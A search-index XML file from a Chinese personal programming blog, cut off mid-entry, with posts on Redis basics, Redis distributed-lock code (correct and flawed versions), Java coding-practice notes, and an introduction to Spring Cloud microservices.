<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2020/10/05/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0/"/>
    <url>/2020/10/05/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Java8-新特性学习"><a href="#Java8-新特性学习" class="headerlink" title="Java8 新特性学习"></a>Java8 新特性学习</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2020/10/05/%E5%90%8E%E7%AB%AF%E6%88%90%E7%A5%9E%E4%B9%8B%E8%B7%AF/"/>
    <url>/2020/10/05/%E5%90%8E%E7%AB%AF%E6%88%90%E7%A5%9E%E4%B9%8B%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>“别让我在后悔，苦恼了”</p><p>​                                ——未来的我</p><h2 id="一、Redis"><a href="#一、Redis" class="headerlink" title="一、Redis"></a>一、Redis</h2><h3 id="1、学习资料"><a href="#1、学习资料" class="headerlink" title="1、学习资料"></a>1、学习资料</h3><p>慕课网,Redis基础知识—— <a href="http://www.imooc.com/learn/839">http://www.imooc.com/learn/839</a></p><p>B站全套视频—— <a href="https://www.bilibili.com/video/BV1CJ411m7Gc?from=search&amp;seid=911921139198142504">https://www.bilibili.com/video/BV1CJ411m7Gc?from=search&amp;seid=911921139198142504</a></p><h3 id="二、多线程"><a href="#二、多线程" class="headerlink" title="二、多线程"></a>二、多线程</h3><h2 id="三、Java8新特性"><a href="#三、Java8新特性" class="headerlink" title="三、Java8新特性"></a>三、Java8新特性</h2><h2 id="四、mysql优化"><a href="#四、mysql优化" class="headerlink" title="四、mysql优化"></a>四、mysql优化</h2><h2 id="五、Liunx"><a href="#五、Liunx" class="headerlink" title="五、Liunx"></a>五、Liunx</h2><h2 id="六、JVM调优"><a href="#六、JVM调优" class="headerlink" title="六、JVM调优"></a>六、JVM调优</h2><h2 id="七、分布式中间件"><a href="#七、分布式中间件" class="headerlink" title="七、分布式中间件"></a>七、分布式中间件</h2><h2 id="八、消息队列"><a href="#八、消息队列" class="headerlink" title="八、消息队列"></a>八、消息队列</h2><h2 id="九、搜索引擎"><a href="#九、搜索引擎" class="headerlink" title="九、搜索引擎"></a>九、搜索引擎</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2020/10/05/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    <url>/2020/10/05/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>消息队列</p><p><a href="https://www.cnblogs.com/williamjie/p/9481780.html">https://www.cnblogs.com/williamjie/p/9481780.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2020/10/05/%E4%BC%98%E7%A7%80%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
    <url>/2020/10/05/%E4%BC%98%E7%A7%80%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="优秀的博客"><a href="#优秀的博客" class="headerlink" title="优秀的博客"></a>优秀的博客</h1><p>博客园-割肉机 <a href="https://www.cnblogs.com/williamjie/">https://www.cnblogs.com/williamjie/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2020/10/05/Redis/"/>
    <url>/2020/10/05/Redis/</url>
    
    <content type="html"><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p>慕课网,Redis基础知识—— <a href="http://www.imooc.com/learn/839">http://www.imooc.com/learn/839</a></p><p>B站全套视频—— <a href="https://www.bilibili.com/video/BV1CJ411m7Gc?from=search&amp;seid=911921139198142504">https://www.bilibili.com/video/BV1CJ411m7Gc?from=search&amp;seid=911921139198142504</a></p><h1 id="一、Redis简介"><a href="#一、Redis简介" class="headerlink" title="一、Redis简介"></a>一、Redis简介</h1><h2 id="1、redis解决的问题"><a href="#1、redis解决的问题" class="headerlink" title="1、redis解决的问题"></a>1、redis解决的问题</h2><pre><code class="hljs java">网站出现崩溃的原因：<span class="hljs-number">1</span>、海量用户<span class="hljs-number">2</span>、高并发罪魁祸首————关系型数据库性能瓶颈：磁盘IO性能低下扩展瓶颈：数据关系复杂，扩展性差，不便于大规模集群解决思路：降低磁盘IO次数，越低越好 ———— 内存存储去除数据关系，越简单越好 ———— 不存储关系，仅存数据</code></pre><h2 id="2、Nosql"><a href="#2、Nosql" class="headerlink" title="2、Nosql"></a>2、Nosql</h2><pre><code class="hljs java">NoSQL：即Not-OnlySQL(泛指非关系型的数据库)，作为关系型数据的补充作用：应对基于海量用户和海量数据前提下的处理问题特征：<span class="hljs-number">1</span>、可扩容、可伸缩<span class="hljs-number">2</span>、大数据量下高性能<span class="hljs-number">3</span>、灵活的数据模型<span class="hljs-number">4</span>、高可用常见的NoSQL数据库：  Redis  memcache  Hbase  MongoDB</code></pre><h2 id="3、解决方案（电商场景）"><a href="#3、解决方案（电商场景）" class="headerlink" title="3、解决方案（电商场景）"></a>3、解决方案（电商场景）</h2><pre><code class="hljs java">——MySQL：<span class="hljs-number">1</span>、商品基本信息<span class="hljs-number">2</span>、价格<span class="hljs-number">3</span>、厂商——MongoDB：<span class="hljs-number">1</span>、商品描述<span class="hljs-number">2</span>、商品详情<span class="hljs-number">3</span>、评论——分布式文件系统：<span class="hljs-number">1</span>、图片信息——Lucene、Solr：<span class="hljs-number">1</span>、搜索关键字——Redis：<span class="hljs-number">1</span>、热点数据</code></pre><h2 id="4、Redis简介"><a href="#4、Redis简介" class="headerlink" title="4、Redis简介"></a>4、Redis简介</h2><pre><code class="hljs lsl">概念：Redis(REmote DIctionary Server)是用C语音开发的一个开源的高性能键值对（<span class="hljs-type">key</span>-value）数据库特征：<span class="hljs-number">1</span>、数据间没有必然的关联关系<span class="hljs-number">2</span>、内部采用单线程进行工作<span class="hljs-number">3</span>、高性能。官方提供测试数据，</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Redis实现分布式锁</title>
    <link href="/2020/06/04/Redis%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"/>
    <url>/2020/06/04/Redis%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</url>
    
    <content type="html"><![CDATA[<h1 id="Redis实现分布式锁"><a href="#Redis实现分布式锁" class="headerlink" title="Redis实现分布式锁"></a>Redis实现分布式锁</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>​        分布式锁一般有三种实现方式：1. 数据库乐观锁；2. 基于Redis的分布式锁；3. 基于ZooKeeper的分布式锁。</p><h2 id="二、可靠性"><a href="#二、可靠性" class="headerlink" title="二、可靠性"></a>二、可靠性</h2><p>​        为了确保分布式锁的可用性，至少要确保锁的实现同时满足以下四个条件：</p><ul><li>互斥性。在任意时刻，只有一个客户端能持有锁。</li><li>杜绝发生死锁。即使有一个客户端在持有锁的期间奔溃而没有主动解锁，也能保证后续其他客户端能加锁。</li><li>具有容错性。只要大部分的redis节点正常运行，客户端就可以加锁和解锁。</li><li>解铃还须系铃人。加锁和解锁必须是同一个客户端，客户端自己不能把别人加的锁给解了。</li></ul><h2 id="三、代码实现"><a href="#三、代码实现" class="headerlink" title="三、代码实现"></a>三、代码实现</h2><h3 id="1、组件依赖"><a href="#1、组件依赖" class="headerlink" title="1、组件依赖"></a>1、组件依赖</h3><pre><code class="hljs java">&lt;dependency&gt;    &lt;groupId&gt;redis.clients&lt;/groupId&gt;    &lt;artifactId&gt;jedis&lt;/artifactId&gt;    &lt;version&gt;2.9.0&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="2、加锁代码-正确代码"><a href="#2、加锁代码-正确代码" class="headerlink" title="2、加锁代码-正确代码"></a>2、加锁代码-正确代码</h3><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RedisTool</span> </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String LOCK_SUCCESS = <span class="hljs-string">&quot;OK&quot;</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SET_IF_NOT_EXIST = <span class="hljs-string">&quot;NX&quot;</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SET_WITH_EXPIRE_TIME = <span class="hljs-string">&quot;PX&quot;</span>;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 尝试获取分布式锁</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> jedis Redis客户端</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> lockKey 锁</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> requestId 请求标识</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> expireTime 超期时间</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 是否获取成功</span><span class="hljs-comment">     */</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">tryGetDistributedLock</span><span class="hljs-params">(Jedis jedis, String lockKey, String requestId, <span class="hljs-keyword">int</span> expireTime)</span> </span>&#123;        String result = jedis.set(lockKey, requestId, SET_IF_NOT_EXIST,SET_WITH_EXPIRE_TIME, expireTime);        <span class="hljs-keyword">if</span> (LOCK_SUCCESS.equals(result)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;&#125;</code></pre><p>可以看到，我们加锁就一行代码：<code>jedis.set(String key, String value, String nxxx, String expx, int time)</code>，这个set()方法一共有五个形参：</p><ul><li>第一个为key，我们使用key来当锁，因为key是唯一的。</li><li>第二个为value，我们传的是requestId，很多童鞋可能不明白，有key作为锁不就够了吗，为什么还要用到value？原因就是我们在上面讲到可靠性时，分布式锁要满足第四个条件解铃还须系铃人，通过给value赋值为requestId，我们就知道这把锁是哪个请求加的了，在解锁的时候就可以有依据。requestId可以使用<code>UUID.randomUUID().toString()</code>方法生成。</li><li>第三个为nxxx，这个参数我们填的是NX，意思是SET IF NOT EXIST，即当key不存在时，我们进行set操作；若key已经存在，则不做任何操作；</li><li>第四个为expx，这个参数我们传的是PX，意思是我们要给这个key加一个过期的设置，具体时间由第五个参数决定。</li><li>第五个为time，与第四个参数相呼应，代表key的过期时间。</li></ul><p>总的来说，执行上面的set()方法就只会导致两种结果：1. 当前没有锁（key不存在），那么就进行加锁操作，并对锁设置个有效期，同时value表示加锁的客户端。2. 已有锁存在，不做任何操作。</p><p>心细的童鞋就会发现了，我们的加锁代码满足我们可靠性里描述的三个条件。首先，set()加入了NX参数，可以保证如果已有key存在，则函数不会调用成功，也就是只有一个客户端能持有锁，满足互斥性。其次，由于我们对锁设置了过期时间，即使锁的持有者后续发生崩溃而没有解锁，锁也会因为到了过期时间而自动解锁（即key被删除），不会发生死锁。最后，因为我们将value赋值为requestId，代表加锁的客户端请求标识，那么在客户端在解锁的时候就可以进行校验是否是同一个客户端。由于我们只考虑Redis单机部署的场景，所以容错性我们暂不考虑。</p><h3 id="3、错误示例1"><a href="#3、错误示例1" class="headerlink" title="3、错误示例1"></a>3、错误示例1</h3><p>比较常见的错误示例就是使用<code>jedis.setnx()</code>和<code>jedis.expire()</code>组合实现加锁，代码如下：</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wrongGetLock1</span><span class="hljs-params">(Jedis jedis, String lockKey, String requestId, <span class="hljs-keyword">int</span> expireTime)</span> </span>&#123;    Long result = jedis.setnx(lockKey, requestId);    <span class="hljs-keyword">if</span> (result == <span class="hljs-number">1</span>) &#123;        <span class="hljs-comment">// 若在这里程序突然崩溃，则无法设置过期时间，将发生死锁</span>        jedis.expire(lockKey, expireTime);    &#125;&#125;</code></pre><p>setnx()方法作用就是SET IF NOT EXIST，expire()方法就是给锁加一个过期时间。乍一看好像和前面的set()方法结果一样，然而由于这是两条Redis命令，不具有原子性，如果程序在执行完setnx()之后突然崩溃，导致锁没有设置过期时间。那么将会发生死锁。网上之所以有人这样实现，是因为低版本的jedis并不支持多参数的set()方法。</p><h3 id="4、错误示例2"><a href="#4、错误示例2" class="headerlink" title="4、错误示例2"></a>4、错误示例2</h3><p>这一种错误示例就比较难以发现问题，而且实现也比较复杂。实现思路：使用<code>jedis.setnx()</code>命令实现加锁，其中key是锁，value是锁的过期时间。执行过程：</p><ol><li>通过setnx()方法尝试加锁，如果当前锁不存在，返回加锁成功。</li><li>如果锁已经存在则获取锁的过期时间，和当前时间比较，如果锁已经过期，则设置新的过期时间，返回加锁成功。代码如下：</li></ol><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">wrongGetLock2</span><span class="hljs-params">(Jedis jedis, String lockKey, <span class="hljs-keyword">int</span> expireTime)</span> </span>&#123;    <span class="hljs-keyword">long</span> expires = System.currentTimeMillis() + expireTime;    String expiresStr = String.valueOf(expires);    <span class="hljs-comment">// 如果当前锁不存在，返回加锁成功</span>    <span class="hljs-keyword">if</span> (jedis.setnx(lockKey, expiresStr) == <span class="hljs-number">1</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;    &#125;    <span class="hljs-comment">// 如果锁存在，获取锁的过期时间</span>    String currentValueStr = jedis.get(lockKey);    <span class="hljs-keyword">if</span> (currentValueStr != <span class="hljs-keyword">null</span> &amp;&amp; Long.parseLong(currentValueStr) &lt; System.currentTimeMillis()) &#123;        <span class="hljs-comment">// 锁已过期，获取上一个锁的过期时间，并设置现在锁的过期时间</span>        String oldValueStr = jedis.getSet(lockKey, expiresStr);        <span class="hljs-keyword">if</span> (oldValueStr != <span class="hljs-keyword">null</span> &amp;&amp; oldValueStr.equals(currentValueStr)) &#123;            <span class="hljs-comment">// 考虑多线程并发的情况，只有一个线程的设置值和当前值相同，它才有权利加锁</span>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125;    &#125;            <span class="hljs-comment">// 其他情况，一律返回加锁失败</span>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;</code></pre><p>那么这段代码问题在哪里？</p><ol><li>由于是客户端自己生成过期时间，所以需要强制要求分布式下每个客户端的时间必须同步。</li><li>当锁过期的时候，如果多个客户端同时执行<code>jedis.getSet()</code>方法，那么虽然最终只有一个客户端可以加锁，但是这个客户端的锁的过期时间可能被其他客户端覆盖。</li><li>锁不具备拥有者标识，即任何客户端都可以解锁。</li></ol><h3 id="5、解锁代码-正确代码"><a href="#5、解锁代码-正确代码" class="headerlink" title="5、解锁代码-正确代码"></a>5、解锁代码-正确代码</h3><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RedisTool</span> </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Long RELEASE_SUCCESS = <span class="hljs-number">1L</span>;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 释放分布式锁</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> jedis Redis客户端</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> lockKey 锁</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> requestId 请求标识</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 是否释放成功</span><span class="hljs-comment">     */</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">releaseDistributedLock</span><span class="hljs-params">(Jedis jedis, String lockKey, String requestId)</span> </span>&#123;        String script = <span class="hljs-string">&quot;if redis.call(&#x27;get&#x27;, KEYS[1]) == ARGV[1] then return redis.call(&#x27;del&#x27;, KEYS[1]) else return 0 end&quot;</span>;        Object result = jedis.eval(script, Collections.singletonList(lockKey), Collections.singletonList(requestId));        <span class="hljs-keyword">if</span> (RELEASE_SUCCESS.equals(result)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;&#125;</code></pre><p>我们将Lua代码传到<code>jedis.eval()</code>方法里，并使参数KEYS[1]赋值为lockKey，ARGV[1]赋值为requestId。eval()方法是将Lua代码交给Redis服务端执行。首先获取锁对应的value值，检查是否与requestId相等，如果相等则删除锁（解锁）。</p><p>执行eval()方法可以确保原子性，源于Redis的特性，在eval命令执行Lua代码的时候，Lua代码将被当成一个命令去执行，并且直到eval命令执行完成，Redis才会执行其他命令。</p><h3 id="6、错误示例1"><a href="#6、错误示例1" class="headerlink" title="6、错误示例1"></a>6、错误示例1</h3><p>最常见的解锁代码就是直接使用<code>jedis.del()</code>方法删除锁，这种不先判断锁的拥有者而直接解锁的方式，会导致任何客户端都可以随时进行解锁，即使这把锁不是它的。</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wrongReleaseLock1</span><span class="hljs-params">(Jedis jedis, String lockKey)</span> </span>&#123;    jedis.del(lockKey);&#125;</code></pre><h3 id="7、错误示例2"><a href="#7、错误示例2" class="headerlink" title="7、错误示例2"></a>7、错误示例2</h3><p>这种解锁代码乍一看也是没问题，甚至我之前也差点这样实现，与正确姿势差不多，唯一区别的是分成两条命令去执行，代码如下：</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wrongReleaseLock2</span><span class="hljs-params">(Jedis jedis, String lockKey, String requestId)</span> </span>&#123;            <span class="hljs-comment">// 判断加锁与解锁是不是同一个客户端</span>    <span class="hljs-keyword">if</span> (requestId.equals(jedis.get(lockKey))) &#123;        <span class="hljs-comment">// 若在此时，这把锁突然不是这个客户端的，则会误解锁</span>        jedis.del(lockKey);    &#125;&#125;</code></pre><p>如代码注释，问题在于如果调用<code>jedis.del()</code>方法的时候，这把锁已经不属于当前客户端的时候会解除他人加的锁。那么是否真的有这种场景？答案是肯定的，比如客户端A加锁，一段时间之后客户端A解锁，在执行<code>jedis.del()</code>之前，锁突然过期了，此时客户端B尝试加锁成功，然后客户端A再执行del()方法，则将客户端B的锁给解除了。</p><p>转载：<a href="https://www.cnblogs.com/williamjie/p/9395659.html">https://www.cnblogs.com/williamjie/p/9395659.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Redis</category>
      
    </categories>
    
    
    <tags>
      
      <tag>分布式锁</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>读书笔记-编写高质量代码 改善Java程序的151个建议</title>
    <link href="/2020/06/03/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%BC%96%E5%86%99%E9%AB%98%E8%B4%A8%E9%87%8F%E4%BB%A3%E7%A0%81%20%E6%94%B9%E5%96%84Java%E7%A8%8B%E5%BA%8F%E7%9A%84151%E4%B8%AA%E5%BB%BA%E8%AE%AE/"/>
    <url>/2020/06/03/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%BC%96%E5%86%99%E9%AB%98%E8%B4%A8%E9%87%8F%E4%BB%A3%E7%A0%81%20%E6%94%B9%E5%96%84Java%E7%A8%8B%E5%BA%8F%E7%9A%84151%E4%B8%AA%E5%BB%BA%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="读书笔记-编写高质量代码-改善Java程序的151个建议"><a href="#读书笔记-编写高质量代码-改善Java程序的151个建议" class="headerlink" title="读书笔记-编写高质量代码 改善Java程序的151个建议"></a>读书笔记-编写高质量代码 改善Java程序的151个建议</h1><p>时间轴：2020-06-03 因工作需要出差湖南长沙,闲时发现这本书,希望能在这炎热的地方带给汪洋般的知识。</p><p>在此特别感谢《编写高质量代码 改善Java程序的151个建议》秦小波作者，提供如此优秀的书籍供我们学习。</p><p>以下笔记仅供<strong>个人学习</strong>使用，未用于商业经营，如有侵权请联系<a href="mailto:&#52;&#x31;&#55;&#x38;&#54;&#48;&#x36;&#x33;&#x34;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;">&#52;&#x31;&#55;&#x38;&#54;&#48;&#x36;&#x33;&#x34;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;</a></p><h1 id="第一章、Java开发中通用的方法和准则"><a href="#第一章、Java开发中通用的方法和准则" class="headerlink" title="第一章、Java开发中通用的方法和准则"></a>第一章、Java开发中通用的方法和准则</h1><h3 id="建议1：常量和变量中不要出易混淆的字母"><a href="#建议1：常量和变量中不要出易混淆的字母" class="headerlink" title="建议1：常量和变量中不要出易混淆的字母"></a>建议1：常量和变量中不要出易混淆的字母</h3><pre><code class="hljs java">包名全部小写，类名首字母全大写，常量全部大写并用用下划线分割，变量采用驼峰命名法命名。不要出现 <span class="hljs-keyword">long</span> = <span class="hljs-number">1l</span>; 数字<span class="hljs-string">&quot;1&quot;</span>和字母<span class="hljs-string">&quot;l&quot;</span>容易混淆。</code></pre><h3 id="建议2：莫让常量蜕变成变量"><a href="#建议2：莫让常量蜕变成变量" class="headerlink" title="建议2：莫让常量蜕变成变量"></a>建议2：莫让常量蜕变成变量</h3><pre><code class="hljs java">定义常量时，在编译器就必须确定其值，不应该在运行期更改例如：<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> dateTime = <span class="hljs-keyword">new</span> Date();</code></pre><h3 id="建议3：三元操作符的类型务必一致"><a href="#建议3：三元操作符的类型务必一致" class="headerlink" title="建议3：三元操作符的类型务必一致"></a>建议3：三元操作符的类型务必一致</h3><pre><code class="hljs java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        <span class="hljs-keyword">int</span> i = <span class="hljs-number">80</span>;        String s = String.valueOf(i &lt; <span class="hljs-number">100</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">100</span>);        String s1 = String.valueOf(i &lt; <span class="hljs-number">100</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">100.0</span>);        System.out.println(s.equals(s1)); <span class="hljs-comment">// false</span>    &#125;若两个操作数不可转换，则不做转换，返回值为Object类型若两个操作数是明确类型的表达式（比如变量），则按照正常的二进制数字来转换，<span class="hljs-keyword">int</span>类型转换成<span class="hljs-keyword">long</span>类型，<span class="hljs-keyword">long</span>类型转换成<span class="hljs-keyword">float</span>类型等。若两个操作数中有一个是数字S，另一个是表达式，且其类型标识为T,那么若数字S在T范围内，则转换成T类型，若S超出T类型的范围，则T转换成S类型若两个操作数都是直接量数字，则返回值类型为范围较大者。</code></pre><h3 id="建议4：避免带有变长参数的方法重载"><a href="#建议4：避免带有变长参数的方法重载" class="headerlink" title="建议4：避免带有变长参数的方法重载"></a>建议4：避免带有变长参数的方法重载</h3><h3 id="建议5：别让null值和空值威胁到变长方法"><a href="#建议5：别让null值和空值威胁到变长方法" class="headerlink" title="建议5：别让null值和空值威胁到变长方法"></a>建议5：别让null值和空值威胁到变长方法</h3><h3 id="建议6：覆写变长方法也循规蹈矩"><a href="#建议6：覆写变长方法也循规蹈矩" class="headerlink" title="建议6：覆写变长方法也循规蹈矩"></a>建议6：覆写变长方法也循规蹈矩</h3><h3 id="建议7：警惕自增的陷阱"><a href="#建议7：警惕自增的陷阱" class="headerlink" title="建议7：警惕自增的陷阱"></a>建议7：警惕自增的陷阱</h3><pre><code class="hljs java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;            count = count ++;        &#125;        System.out.println(count); <span class="hljs-comment">// 0</span>    &#125;解析：i++表示的是先赋值后加<span class="hljs-number">1</span>，++i是先加<span class="hljs-number">1</span>后赋count++是一个表达式，是有返回值的，他的返回值就是count自加前的值，java对自加是这样处理的：首先把count的值（注意是值，不是引用）拷贝到一个临时变量区，然后对count变量加<span class="hljs-number">1</span>，最后返回临时变量区的值。        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;             count++;        &#125;        System.out.println(+count); <span class="hljs-comment">// 10</span>    &#125;</code></pre><h3 id="建议8：编程中尽量不要出现旧语法，如果时间过久会困扰-看不懂-编程。"><a href="#建议8：编程中尽量不要出现旧语法，如果时间过久会困扰-看不懂-编程。" class="headerlink" title="建议8：编程中尽量不要出现旧语法，如果时间过久会困扰(看不懂)编程。"></a>建议8：编程中尽量不要出现旧语法，如果时间过久会困扰(看不懂)编程。</h3><p>建议9：少用静态导入</p>]]></content>
    
    
    <categories>
      
      <category>读书</category>
      
    </categories>
    
    
    <tags>
      
      <tag>高性能</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringCloud-入门</title>
    <link href="/2020/05/16/SpringCloud/"/>
    <url>/2020/05/16/SpringCloud/</url>
    
    <content type="html"><![CDATA[<h1 id="SpringCloud-入门"><a href="#SpringCloud-入门" class="headerlink" title="SpringCloud-入门"></a>SpringCloud-入门</h1><h1 id="第一章、微服务架构概要"><a href="#第一章、微服务架构概要" class="headerlink" title="第一章、微服务架构概要"></a>第一章、微服务架构概要</h1><h2 id="1-1、什么是微服务"><a href="#1-1、什么是微服务" class="headerlink" title="1.1、什么是微服务"></a>1.1、什么是微服务</h2><p>​      马丁·福勒 ，他于2014年发表了一篇关于微服务的博客<a href="https://martinfowler.com/microservices/">https://martinfowler.com/microservices/</a></p><p>​      英文：<a href="https://martinfowler.com/articles/microservices.html#MicroservicesAndSoa">https://martinfowler.com/articles/microservices.html#MicroservicesAndSoa</a></p><p>​       微服务是一种架构风格，是以开发一组小型服务的方式来作为一个<strong>独立</strong>的应用系统，每个服务都运行在<br>自已的进程中，服务之间采用轻量级的<strong>HTTP</strong>通信机制 ( 通常是采用HTTP的RESTful API )进行通信。这<br>些服务都是围绕具体业务进行构建的，并且可以独立部署到生产环境上。这些服务可以用<strong>不同的编程语</strong><br><strong>言</strong>编写，并且可以使用<strong>不同的数据存储</strong>技术。对这些微服务我们只需要使用一个非常轻量级的集中式管<br>理来进行协调。</p><h2 id="1-2、单体应用架构"><a href="#1-2、单体应用架构" class="headerlink" title="1.2、单体应用架构"></a>1.2、单体应用架构</h2><p>一个应用包含了应用程序的所有功能。</p><pre><code class="hljs java">优点：易于开发、测试、部署易于整体扩展，当负载压力大时，可以部署多个后台用nginx进行负载均衡缺点：复杂度高，单个应用包含多个模块，依赖关系不清晰、代码的质量参差不齐技术债务，随着时间推移，需求、人员的变更，会逐渐形成应用程序的技术债务阻碍技术创新，需要使用相同的开发语音和持久化存储</code></pre><h2 id="1-3、微服务架构"><a href="#1-3、微服务架构" class="headerlink" title="1.3、微服务架构"></a>1.3、微服务架构</h2><p>微服务是一种架构风格，是以开发一组小型服务的方式来作为一个独立的应用系统，每个服务都运行在自已<br>的进程中，服务之间采用轻量级的HTTP通信机制 ( 通常是采用HTTP的RESTful API )进行通信</p><pre><code class="hljs java">优点:  易于开发和维护,一个微服务只会关注一个特定的业务功能，所以业务清晰、代码量较少  单个微服务启动较快  局部修改容易部署  技术栈不受限制  按需伸缩缺点:运维要求高  分布式固有的复杂性  接口调整成本高</code></pre><h2 id="1-4、微服务架构技术栈"><a href="#1-4、微服务架构技术栈" class="headerlink" title="1.4、微服务架构技术栈"></a>1.4、微服务架构技术栈</h2><table><thead><tr><th>技术实现</th><th>微服务技术维度</th></tr></thead><tbody><tr><td>服务开发</td><td>Spring Boot、Spring、Spring MVC等</td></tr><tr><td>服务注册与发现</td><td>Eureka、Zookeeper等</td></tr><tr><td>服务调用</td><td>Rest、RPC等</td></tr><tr><td>服务熔断器</td><td>Hystrix、Envoy等</td></tr><tr><td>负载均衡</td><td>Ribbon、Nginx等</td></tr><tr><td>服务接口调用(客户端调用服务的简化工具)</td><td>Feign等</td></tr><tr><td>消息队列</td><td>Kafka、ActiveMQ等</td></tr><tr><td>服务配置中心管理</td><td>Spring Cloud Config等</td></tr><tr><td>服务路由（API网关）</td><td>Zuul等</td></tr><tr><td>服务监控</td><td>Zabbix、Nagios等</td></tr><tr><td>全链路追踪</td><td>Zipkin，Brave等</td></tr><tr><td>服务部署</td><td>Docker、OpenStack等</td></tr><tr><td>数据流处理</td><td>Spring Cloud Stream（Redis,Rabbit,Kafka等发送接收消息）</td></tr><tr><td>事件消息总线</td><td>Spring Cloud Bus</td></tr></tbody></table><h1 id="第二章、Spring-Cloud概要"><a href="#第二章、Spring-Cloud概要" class="headerlink" 